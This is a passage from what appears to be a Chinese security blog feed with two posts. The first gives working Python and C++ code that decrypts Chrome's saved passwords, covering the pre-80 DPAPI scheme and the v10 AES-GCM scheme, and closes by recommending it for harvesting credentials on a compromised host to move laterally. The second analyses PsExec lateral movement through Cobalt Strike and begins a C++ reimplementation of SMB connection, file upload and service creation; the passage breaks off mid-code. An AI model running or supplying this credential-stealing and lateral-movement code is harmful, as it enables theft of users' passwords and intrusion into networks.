class="headerlink" title="实验过程"></a>实验过程</h3><p>chrome的密码经过加密后存储在</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"><span class="hljs-variable">%LocalAppData%</span><span class="hljs-symbol">\G</span>oogle<span class="hljs-symbol">\C</span>hrome<span class="hljs-symbol">\U</span>ser Data<span class="hljs-symbol">\D</span>efault<span class="hljs-symbol">\L</span>ogin Data<br></code></pre></td></tr></table></figure><p>如果用二进制文本编辑器查看的化会发现他其实是一个sqlite数据库文件</p><p><img src="/img/CatchChrome/4.png"></p><p>可以使用工具SQLiteStudio打开他</p><p>双击logins</p><p><img src="/img/CatchChrome/5.png"></p><p>选择data<br><img src="/img/CatchChrome/6.png"></p><p>可以看到有用户名和网址,却没有密码</p><p>但是密码的二进制实际是有值的</p><p><img src="/img/CatchChrome/7.png"></p><h3 id="编写脚本解密"><a href="#编写脚本解密" class="headerlink" title="编写脚本解密"></a>编写脚本解密</h3><p>python的解密是最简洁的，这里送上一个三好学生的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> getenv<br><span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">import</span> win32crypt<br><span class="hljs-keyword">import</span> binascii<br>conn = sqlite3.connect(getenv(<span class="hljs-string">&quot;APPDATA&quot;</span>) + <span class="hljs-string">&quot;\..\Local\Google\Chrome\User Data\Default\Login Data&quot;</span>)<br>cursor = conn.cursor()<br>cursor.execute(<span class="hljs-string">&#x27;SELECT action_url, username_value, password_value FROM logins&#x27;</span>)<br><span class="hljs-keyword">for</span> result <span class="hljs-keyword">in</span> cursor.fetchall():<br>    password = win32crypt.CryptUnprotectData(result[<span class="hljs-number">2</span>], <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-number">0</span>)[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">if</span> password:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Site: &#x27;</span> + result[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Username: &#x27;</span> + result[<span class="hljs-number">1</span>]<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Password: &#x27;</span> + password<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;no password found&quot;</span><br></code></pre></td></tr></table></figure><p>但我还是想c++写一个</p><p>编写之前,需要配置sqlite3环境,并且下载<code>&lt;sqlite3.h&gt;</code>和<code>&lt;sqlite3.c&gt;</code>文件</p><p>如果当前用户正在使用谷歌,是无法打开数据库的,于是我们可以复制一份出来操作</p><p><img src="/img/CatchChrome/8.png"></p><p>再通过sql语句查找logins表</p><p><img src="/img/CatchChrome/9.png"></p><p>在回调函数中解密</p><p><img src="/img/CatchChrome/10.png"></p><p>看下效果,完美解出密码</p><p><img src="/img/CatchChrome/11.png"></p><p>与谷歌浏览器上面看到的也是一样的,无需再验证用户密码</p><p><img src="/img/CatchChrome/12.png"></p><h2 id="80版本之后的Chrome"><a href="#80版本之后的Chrome" class="headerlink" title="80版本之后的Chrome"></a>80版本之后的Chrome</h2><p>那么80.x之后的Chrome如何解密呢</p><h3 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h3><ul><li>win10</li><li>Chrome版本 91.0.4472.101(最新版)</li></ul><h3 id="实验分析"><a href="#实验分析" class="headerlink" title="实验分析"></a>实验分析</h3><p>先看一下跟以前版本的Chrome存储方式上有什么区别</p><p><img src="/img/CatchChrome/13.png"></p><p><img src="/img/CatchChrome/14.png"></p><p>判断是否是新版本的Chrome加密其实就是看它加密后值的前面有没有v10或者v11</p><p>看官方文档,分析新版加密算法</p><p>key的初始化<br><a href="https://source.chromium.org/chromium/chromium/src/+/master:components/os_crypt/os_crypt_win.cc;l=192;drc=f59fc2f1cf0efae49ea96f9070bead4991f53fea">https://source.chromium.org/chromium/chromium/src/+/master:components/os_crypt/os_crypt_win.cc;l=192;drc=f59fc2f1cf0efae49ea96f9070bead4991f53fea</a></p><p><img src="/img/CatchChrome/15.png"></p><p><img src="/img/CatchChrome/16.png"><br>注释:尝试从local state提取密钥。</p><p>并且可以看到<code>kDPAPIKeyPrefix</code>实际上就是一个字符串”DPAPI”</p><p><img src="/img/CatchChrome/17.png"></p><p>然后就是进行DPAPI的解密,最后就是如果key不在local state中或者DPAPI解密失败,就重新生成一个key</p><p>从这里我们我可以大致分析出key初始化时的动作:</p><ol><li>从local state文件中提取key</li><li>base64解密key</li><li>去除key开头的“DPAPI”</li><li>DPAPI解密,得到最终的key</li></ol><p>跟进<code>GetString</code>函数的参数<code>kOsCryptEncryptedKeyPrefName</code></p><p><img src="/img/CatchChrome/18.png"></p><p>知道key存放在local state文件os_crypt.encrypted_key字段中,即</p><p><img src="/img/CatchChrome/19.png"></p><p>而local state文件就在本地默认目录:</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"><span class="hljs-variable">%LocalAppData%</span><span class="hljs-symbol">\G</span>oogle<span class="hljs-symbol">\C</span>hrome<span class="hljs-symbol">\U</span>ser Data<span class="hljs-symbol">\L</span>ocal State<br></code></pre></td></tr></table></figure><p>Local State是一个JSON格式的文件</p><h3 id="明文加密方式"><a href="#明文加密方式" class="headerlink" title="明文加密方式"></a>明文加密方式</h3><p>看源码注释</p><p><img src="/img/CatchChrome/20.png"></p><p>密钥加密后数据前缀是“v10”</p><p><img src="/img/CatchChrome/21.png"></p><p>密钥和NONCE/IV的长度分别为：32字节和12字节</p><p><img src="/img/CatchChrome/22.png"></p><p>这里解释一下NONCE/IV是什么:</p><p>如果我们不希望相同的明文通过密钥加密出来的密文是相同的(这样很容易让攻击者知道这两条密文的明文是相同的) 解决办法是使用IV（初始向量）或nonce（只使用一次的数值）。因为对于每条加密消息，我们都可以使用不同的byte字符串。它们是非确定理论的起源，而这种理论要求制造出令人难以分辨的副本。这些消息通常不是什么秘密，但为了解密需要，我们会在分发时对它们进行加密。 IV与nonce之间的区别是有争议的，但也不是没有关联的。不同的加密方案所保护的侧重点也不同：有些方案需要的只是密文不重复，这种情况我们通常叫作nonce；还有一些方案需要密文是随机的，甚至完全不可预测的，这种情况我们通常叫作IV。这里其实就是希望即便明文相同,经过加密后的密文也不相同。</p><p>再往下翻,其实可以看到解密函数</p><p><img src="/img/CatchChrome/23.png"></p><p><code>encrypted_value</code>的前缀v10后为12字节的NONCE（IV），然后再是真正的密文。Chrome使用的是AES-256-GCM的AEAD对称加密、</p><p>那么思路就清晰了,这里我自己画了一个图来总结算法</p><p><img src="/img/CatchChrome/24.png"></p><p>实现自动化抓密码<br>解密使用一个非常强大的库,cryptopp</p><p>先获取原始的key</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">string <span class="hljs-title">GetOriginalkey</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string Decoded = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-comment">//获取Local State中的未解密的key</span><br>    string key = <span class="hljs-string">&quot;RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAADWXmStECIlTZZxWMAYf5UmAAAAAAIAAAAAABBmAAAAAQAAIAAAAP8V1h3J1qhEf8/h13hre+e3EMW0oD41Ux7UrEqls4DoAAAAAA6AAAAAAgAAIAAAAA7xXGgN1Hks1TbInimvYa0TnMfPa0jPpmlI9BDiUQAAMAAAAPzO7wya37iu97rDB4UTtn5QwQcuJkw2E3cw/tHuSnHdNv4qwXMWLC2oU3TkysoXmUAAAAAtPkLwNaInulyoGNH4GDxlwbzAW4DP7T8XWsZ/2QB0YrcLqxSNytHlV1qvVyO8D20Eu7jKqD/bMW2MzwEa40iF&quot;</span>;<br>    <span class="hljs-built_in">StringSource</span>((BYTE*)key.<span class="hljs-built_in">c_str</span>(), key.<span class="hljs-built_in">size</span>(), <span class="hljs-literal">true</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">Base64Decoder</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">StringSink</span>(Decoded)));<br>    key = Decoded;<br>    key = key.<span class="hljs-built_in">substr</span>(<span class="hljs-number">5</span>);<span class="hljs-comment">//去除首位5个字符DPAPI</span><br>    Decoded.<span class="hljs-built_in">clear</span>();<span class="hljs-comment">//DPAPI解密</span><br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">char</span> result[<span class="hljs-number">1000</span>] = <span class="hljs-string">&quot;&quot;</span>;<br>    DATA_BLOB DataOut = &#123; <span class="hljs-number">0</span> &#125;;<br>    DATA_BLOB DataVerify = &#123; <span class="hljs-number">0</span> &#125;;<br>    DataOut.pbData = (BYTE*)key.<span class="hljs-built_in">c_str</span>();<br>    DataOut.cbData = <span class="hljs-number">1000</span>;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CryptUnprotectData</span>(&amp;DataOut, <span class="hljs-literal">nullptr</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;DataVerify)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] Decryption failure: %d\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Decryption successfully!\n&quot;</span>);<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; DataVerify.cbData; i++)<br>        &#123;<br>            result[i] = DataVerify.pbData[i];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果当前chrome版本并不是80+,可以通过一个简单的判断:就是看加密密码前有没有”v10“或者”v11“</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++">string e_str = argv[<span class="hljs-number">2</span>];<br><span class="hljs-comment">//判断密文是否包含v10或v11,如果包含则说明是80+的Chrome,用新的解密方法</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(e_str.<span class="hljs-built_in">c_str</span>(), <span class="hljs-string">&quot;v10&quot;</span>) != <span class="hljs-literal">NULL</span> || <span class="hljs-built_in">strstr</span>(e_str.<span class="hljs-built_in">c_str</span>(), <span class="hljs-string">&quot;v11&quot;</span>) != <span class="hljs-literal">NULL</span>)<br>&#123;<br>    <span class="hljs-built_in">NewDecrypt</span>(argc, argv, azColName);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">DecryptoByDPAPI</span>(argv, azColName);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>然后就是解密密文</p><p>获取iv和密文</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//argv[2]是password_value的值</span><br>chiper = argv[<span class="hljs-number">2</span>];<br>iv = argv[<span class="hljs-number">2</span>];<br>iv = iv.<span class="hljs-built_in">substr</span>(<span class="hljs-number">3</span>, <span class="hljs-number">15</span>);  <span class="hljs-comment">//获取iv的值</span><br>chiper = chiper.<span class="hljs-built_in">substr</span>(<span class="hljs-number">15</span>);   <span class="hljs-comment">//加密密码的值</span><br></code></pre></td></tr></table></figure><p>再用<code>cyptopp</code>强大的库函数进行解密</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//获取iv hex编码值</span><br><span class="hljs-built_in">StringSource</span>((BYTE*)iv.<span class="hljs-built_in">c_str</span>(), iv.<span class="hljs-built_in">size</span>(), <span class="hljs-literal">true</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">HexEncoder</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">StringSink</span>(Encoded)));<br>iv = Encoded;<br>Encoded.<span class="hljs-built_in">clear</span>();<br>iv = iv.<span class="hljs-built_in">substr</span>(<span class="hljs-number">0</span>, iv.<span class="hljs-built_in">size</span>() - <span class="hljs-number">6</span>);<br>CHAR Pass_Word[<span class="hljs-number">1000</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-built_in">StringSource</span>((BYTE*)iv.<span class="hljs-built_in">c_str</span>(), iv.<span class="hljs-built_in">size</span>(), <span class="hljs-literal">true</span>,<span class="hljs-keyword">new</span> <span class="hljs-built_in">HexDecoder</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">StringSink</span>(Decoded))); <br>iv = Decoded;<br>Decoded.<span class="hljs-built_in">clear</span>();<br><span class="hljs-keyword">char</span>* key = <span class="hljs-built_in">GetOriginalkey</span>();<br>d.<span class="hljs-built_in">SetKeyWithIV</span>((BYTE*)key, <span class="hljs-number">32</span>, (BYTE*)iv.<span class="hljs-built_in">c_str</span>(), iv.<span class="hljs-built_in">size</span>());<br><br><span class="hljs-built_in">StringSource</span>(chiper, <span class="hljs-literal">true</span>,<span class="hljs-keyword">new</span> <span class="hljs-built_in">AuthenticatedDecryptionFilter</span>(d,<span class="hljs-keyword">new</span> <span class="hljs-built_in">StringSink</span>(password)));<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; password.<span class="hljs-built_in">size</span>(); i++)<br>&#123;<br>    Pass_Word[i] = password[i];<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s = %s\n&quot;</span>, azColName[<span class="hljs-number">0</span>], argv[<span class="hljs-number">0</span>] ? argv[<span class="hljs-number">0</span>] : <span class="hljs-string">&quot;NULL&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s = %s\n&quot;</span>, azColName[<span class="hljs-number">1</span>], argv[<span class="hljs-number">1</span>] ? argv[<span class="hljs-number">1</span>] : <span class="hljs-string">&quot;NULL&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s = %s\n&quot;</span>, azColName[<span class="hljs-number">2</span>], Pass_Word);<br></code></pre></td></tr></table></figure><p>这里逻辑的话参照上面分析步骤,这里就不再赘述</p><p>最后看看解密效果<br><img src="/img/CatchChrome/25.png"></p><p><img src="/img/CatchChrome/26.png"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>实战中如果拿到一台主机,并且安装有chrome,我们就可以抓取密码以便快速精确地横向。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>psexec原理分析</title>
    <link href="/2021/06/20/psexec/"/>
    <url>/2021/06/20/psexec/</url>
    
    <content type="html"><![CDATA[<h2 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h2><p>Psexec被编写的初衷是为了方便服务器管理员管理大量的机器而开发的，但由于它的便捷，同时也被黑客使用。<br>psexec工具下载地址:<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a><br>cs也直接集成了这款工具</p><p><img src="/img/psexec/1.png"></p><h2 id="Psexec原理分析"><a href="#Psexec原理分析" class="headerlink" title="Psexec原理分析"></a>Psexec原理分析</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul><li>win10  ip：192.168.154.7</li><li>win server 2008  X64 192.168.154.31</li></ul><p>假设已经得到win10主机的system权限<br>在cs上通过psexec64来横向win2008</p><p><img src="/img/psexec/2.png"></p><p>这里看到是需要账户和密码的,但是在内网环境中很多密码都是批量设置的,也就是说通过已经拿到的win10的hash去尝试登录内网其他主机<br>可以看到win2008直接上线,并且是system权限</p><p><img src="/img/psexec/3.png"></p><p>看一下win2008的安全日志</p><p><img src="/img/psexec/4.png"></p><p>看到有多个安全日志的产生<br>在事件4624中,看到了win10的ip,也就是申请管理的ip</p><p><img src="/img/psexec/5.png"></p><p>采用的NTMLv2协议,所以即便不知道明文,有hash值就可以转递</p><p><img src="/img/psexec/6.png"></p><p>再看系统日志</p><p><img src="/img/psexec/7.png"></p><p>ADMIN$这个是ipc共享中的默认共享,通常指向C:\Windows</p><p><img src="/img/psexec/8.png"></p><p>猜想就是通过这个exe上线<br><img src="/img/psexec/9.png"></p><p>这里肯定是与直接在win10上通过Psexec管理win2008的流程是不一样的,cs上执行主要目的还是反弹shell到cs上</p><p>大致流程为:</p><ol><li><p>登陆远程主机   事件ID4624</p></li><li><p>连接admin$共享   事件ID7045</p></li><li><p>写入xxxx.exe文件到共享目录下也就是c:\windows下</p></li><li><p>执行xxxx.exe,随即上线</p></li></ol><p>通过wireshark网络分析<br>直接在win10上通过psexec管理win2008</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">.<span class="hljs-string">\PsExec.exe</span> <span class="hljs-string">\\192.168.154.31</span> -u administrator -p <span class="hljs-number">123456</span> cmd<br></code></pre></td></tr></table></figure><p><img src="/img/psexec/10.png"></p><p><img src="/img/psexec/11.png"></p><p>设置过滤规则</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ip.<span class="hljs-attribute">src</span>==192.168.154.31 <span class="hljs-keyword">or</span> ip.<span class="hljs-attribute">dst</span>==192.168.154.31<br></code></pre></td></tr></table></figure><p><img src="/img/psexec/12.png"></p><ol><li><p>先进行TCP三次握手</p></li><li><p>协商协议</p></li><li><p>进行NTML验证</p></li><li><p>尝试连接$IPC</p></li><li><p>尝试连接ADMIN$</p></li><li><p>尝试写入PSEXESVC.exe</p></li></ol><p><img src="/img/psexec/13.png"></p><p>后续TCP数据包的内容,4D5A,标准的pe文件</p><p><img src="/img/psexec/14.png"></p><p>文件写入完毕后,执行API安装服务</p><p><img src="/img/psexec/15.png"></p><p>服务启动后会建立一个管道</p><p><img src="/img/psexec/16.png"></p><p>实际上一共创建了4个管道</p><p><img src="/img/psexec/17.png"></p><p><img src="/img/psexec/18.png"></p><p>整体流程跟从被连接主机的事件看到的流程基本一致。基本都是ntlm认证、连接共享目录admin$、写文件psexesvc到共享目录、调用svcctl服务来间接调用psexesvc服务、创建四个命名管道。</p><h2 id="实现psexec"><a href="#实现psexec" class="headerlink" title="实现psexec"></a>实现psexec</h2><h3 id="一-与目标主机建立SMB连接"><a href="#一-与目标主机建立SMB连接" class="headerlink" title="一.与目标主机建立SMB连接"></a>一.与目标主机建立SMB连接</h3><p>WNetAddConnection2</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">DWORD <span class="hljs-title">WNetAddConnection2W</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPNETRESOURCEW lpNetResource,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR        lpPassword,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR        lpUserName,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD          dwFlags</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>这里有例子:<a href="https://docs.microsoft.com/en-us/windows/win32/api/winnetwk/nf-winnetwk-wnetaddconnection2w">https://docs.microsoft.com/en-us/windows/win32/api/winnetwk/nf-winnetwk-wnetaddconnection2w</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">DWORD <span class="hljs-title">ConnectSMBServer</span><span class="hljs-params">(LPCWSTR lpwsHost, LPCWSTR lpwsUserName, LPCWSTR lpwsPassword)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 用于存放SMB共享资源格式</span><br>    PWCHAR lpwsIPC = <span class="hljs-keyword">new</span> WCHAR[MAX_PATH];<br>    DWORD dwRetVal; <span class="hljs-comment">// 函数返回值</span><br>    NETRESOURCE nr; <span class="hljs-comment">// 连接的详细信息</span><br>    DWORD dwFlags; <span class="hljs-comment">// 连接选项</span><br><br>    <span class="hljs-built_in">ZeroMemory</span>(&amp;nr, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(NETRESOURCE));<br>    <span class="hljs-built_in">swprintf</span>(lpwsIPC, MAX_PATH, <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;\%s\admin$&quot;</span>), lpwsHost);<br>    nr.dwType = RESOURCETYPE_ANY; <span class="hljs-comment">// 枚举所有资源</span><br>    nr.lpLocalName = <span class="hljs-literal">NULL</span>;<br>    nr.lpRemoteName = lpwsIPC; <span class="hljs-comment">// 资源的网络名</span><br>    nr.lpProvider = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">// 如果设置了此位标志，则操作系统将在用户登录时自动尝试恢复连接。</span><br>    dwFlags = CONNECT_UPDATE_PROFILE;<br>    dwRetVal = <span class="hljs-built_in">WNetAddConnection2</span>(&amp;nr, lpwsPassword, lpwsUserName, dwFlags);<br>    <span class="hljs-keyword">if</span> (dwRetVal == NO_ERROR) <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Connection added to %s\n&quot;</span>, nr.lpRemoteName);<br>        <span class="hljs-keyword">return</span> dwRetVal;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;WNetAddConnection2 failed with error: %d\n&quot;</span>, dwRetVal);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="二-上传文件到目标主机"><a href="#二-上传文件到目标主机" class="headerlink" title="二.上传文件到目标主机"></a>二.上传文件到目标主机</h3><p>将现有文件拷贝到新文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CopyFile</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCTSTR lpExistingFileName,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCTSTR lpNewFileName,</span></span><br><span class="hljs-params"><span class="hljs-function">  BOOL    bFailIfExists</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-copyfile?f1url=?appId=Dev16IDEF1&l=ZH-CN&k=k(WINBASE%252FCopyFile);k(CopyFile);k(DevLang-C%252B%252B);k(TargetOS-Windows)&rd=true">https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-copyfile?f1url=%3FappId%3DDev16IDEF1%26l%3DZH-CN%26k%3Dk(WINBASE%252FCopyFile);k(CopyFile);k(DevLang-C%252B%252B);k(TargetOS-Windows)%26rd%3Dtrue</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">UploadFileBySMB</span><span class="hljs-params">(LPCWSTR lpwsSrcPath, LPCWSTR lpwsDstPath)</span></span><br><span class="hljs-function"></span>&#123;<br>    DWORD dwRetVal;<br>    dwRetVal = <span class="hljs-built_in">CopyFile</span>(lpwsSrcPath, lpwsDstPath, FALSE);<br>    <span class="hljs-keyword">return</span> dwRetVal &gt; <span class="hljs-number">0</span> ? TRUE : FALSE;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="三-开启服务"><a href="#三-开启服务" class="headerlink" title="三.开启服务"></a>三.开启服务</h3><p><a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winsvc/nf-winsvc-openscmanagera?redirectedfrom=MSDN&amp;f1url=?appId=Dev16IDEF1&l=ZH-CN&k=k(WINSVC%252FOpenSCManager);k(OpenSCManager);k(DevLang-C%252B%252B);k(TargetOS-Windows)&rd=true">https://docs.microsoft.com/zh-cn/windows/win32/api/winsvc/nf-winsvc-openscmanagera?redirectedfrom=MSDN&amp;f1url=%3FappId%3DDev16IDEF1%26l%3DZH-CN%26k%3Dk(WINSVC%252FOpenSCManager);k(OpenSCManager);k(DevLang-C%252B%252B);k(TargetOS-Windows)%26rd%3Dtrue</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">SC_HANDLE <span class="hljs-title">OpenSCManagerA</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCSTR lpMachineName,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCSTR lpDatabaseName,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD  dwDesiredAccess</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew">https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">SC_HANDLE <span class="hljs-title">CreateServiceW</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  SC_HANDLE hSCManager,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR   lpServiceName,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR   lpDisplayName,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD     dwDesiredAccess,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD     dwServiceType,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD     dwStartType,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD     dwErrorControl,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR   lpBinaryPathName,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR   lpLoadOrderGroup,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPDWORD   lpdwTagId,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR   lpDependencies,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR   lpServiceStartName,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR   lpPassword</span></span><br><span class="hljs-params"><span 